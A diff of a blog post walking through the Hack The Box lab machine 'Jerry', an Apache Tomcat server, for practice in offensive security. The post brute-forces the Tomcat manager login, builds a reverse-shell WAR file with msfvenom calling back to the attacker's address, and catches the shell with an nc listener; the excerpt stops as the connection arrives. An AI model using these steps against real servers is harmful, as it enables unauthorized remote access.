@@ -1,6 +1,6 @@
 This is my write-up/walkthrough for [the Hack The Box machine, Jerry](https://app.hackthebox.com/machines/Jerry). It's a Windows machine, rated "Easy", with 10.10.10.95 as its IP address.
 
-![Alt text](/images/2022-02-16-hack-the-box-jerry-01.JPG "Jerry Info Card")
+![Alt text](/images/2022-02-22-hack-the-box-jerry-01.JPG "Jerry Info Card")
 
 I started with an nmap scan—
 
@@ -34,7 +34,7 @@ Nmap done: 1 IP address (1 host up) scanned in 51.05 seconds
 
 Opening 10.10.10.95:8080 on my browser told me we are dealing with version 7.0.88 of Apache Tomcat. (Well, the nmap scan also pointed that out, but it's good to hit the URL once, if you can.)
 
-![Alt text](/images/2022-02-16-hack-the-box-jerry-02.JPG "Apache Tomcat 7.0.88")
+![Alt text](/images/2022-02-22-hack-the-box-jerry-02.JPG "Apache Tomcat 7.0.88")
 
 Running searchsploit on "Apache Tomcat 7.0.88"—
 
@@ -54,7 +54,7 @@ Shellcodes: No Results
 
 But, in order for me to exploit this vulnerability, I needed the right credentials on this "manager" application – 10.10.10.95:8080/manager.
 
-![Alt text](/images/2022-02-16-hack-the-box-jerry-03.JPG "Manager")
+![Alt text](/images/2022-02-22-hack-the-box-jerry-03.JPG "Manager")
 
 Ran some [common username+password combos](https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown), but none broke through.
 
@@ -324,7 +324,9 @@ msf6 auxiliary(scanner/http/tomcat_mgr_login) >
 
 Got 'em! Our username+password combo is tomcat:s3cret.
 
-![Alt text](/images/2022-02-16-hack-the-box-jerry-04.JPG "Console")
+![Alt text](/images/2022-02-22-hack-the-box-jerry-04.JPG "Console")
+
+Now that I had access to the Application Manager on the server, I could deploy a .war file. I decided to use [mgeeky's tomcatWarDeployer](https://github.com/mgeeky/tomcatWarDeployer), that was mentioned on the article I had been consulting since it looked like a more hands-on way of getting through, but—
 
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
@@ -344,6 +346,15 @@ Resolving deltas: 100% (150/150), done.
 └─$ ls
 LICENSE  README.md  requirements.txt  screen1.png  tomcatWarDeployer.py
                                                                                                                                                                                              
+┌──(thatvirdiguy㉿kali)-[~/tomcatWarDeployer]
+└─$ pip install -r requirements.txt                                                                                                                                                                                                    1 ⨯
+DEPRECATION: Python 2.7 reached the end of its life on January 1st, 2020. Please upgrade your Python as Python 2.7 is no longer maintained. pip 21.0 will drop support for Python 2.7 in January 2021. More details about Python 2 support in pip can be found at https://pip.pypa.io/en/latest/development/release-process/#python-2-support pip 21.0 will remove support for this functionality.                                                                                    
+Defaulting to user installation because normal site-packages is not writeable
+Requirement already satisfied: mechanize in /home/kali/.local/lib/python2.7/site-packages (from -r requirements.txt (line 1)) (0.4.7)
+Requirement already satisfied: html5lib>=0.999999999 in /home/kali/.local/lib/python2.7/site-packages (from mechanize->-r requirements.txt (line 1)) (1.1)
+Requirement already satisfied: six>=1.9 in /home/kali/.local/lib/python2.7/site-packages (from html5lib>=0.999999999->mechanize->-r requirements.txt (line 1)) (1.16.0)
+Requirement already satisfied: webencodings in /home/kali/.local/lib/python2.7/site-packages (from html5lib>=0.999999999->mechanize->-r requirements.txt (line 1)) (0.5.1)
+
 ┌──(thatvirdiguy㉿kali)-[~/tomcatWarDeployer]
 └─$ python2 tomcatWarDeployer.py --help                                                                                                                                                  1 ⨯
 Usage: tomcatWarDeployer.py [options] server
@@ -429,6 +440,10 @@ Traceback (most recent call last):
 __main__.MissingDependencyError
 ```
 
+—I couldn't get it to work properly no matter what I tried.
+
+Eventually, I gave up and moved on to using msfvenom to build the .war file, as that article had suggested.
+
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.2 LPORT=1234 -f war > shell.war
@@ -440,10 +455,22 @@ Final size of war file: 1095 bytes
 shell.war
 ```
 
+Uploaded this file on the server—
+
+![Alt text](/images/2022-02-22-hack-the-box-jerry-05.JPG "Deploy")
+
+—while I had an `nc` listening for connections on port 1234 on my machine.
+
 ```
 ┌──(thatvirdiguy㉿kali)-[~]
 └─$ nc -lvp 1234                                                                                                                                                                         1 ⨯
 listening on [any] 1234 ...
+
+```
+
+Clicked `Deploy` over there and got shell over here.
+
+```
 
 10.10.10.95: inverse host lookup failed: Unknown host
 connect to [10.10.16.2] from (UNKNOWN) [10.10.10.95] 49192
